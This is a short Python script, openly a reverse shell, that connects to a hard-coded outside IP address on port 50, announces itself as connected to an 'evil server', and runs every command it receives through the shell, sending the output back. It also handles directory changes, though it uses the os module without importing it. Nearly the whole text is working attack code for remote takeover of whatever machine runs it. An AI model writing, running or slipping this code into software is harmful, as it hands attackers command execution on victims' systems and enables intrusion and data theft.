import socket
import subprocess

def connect_to_evil_server():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("33.185.19.170", 50))
        s.send(b'Connected to the evil server!')

        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            elif command.lower().startswith("cd "):
                path = command[3:]
                try:
                    os.chdir(path)
                    s.send(b"Changed directory to " + os.getcwd().encode())
                except Exception as e:
                    s.send(str(e).encode())
            else:
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(output.stdout.read() + output.stderr.read())

        s.close()
    except Exception as e:
        pass

connect_to_evil_server()
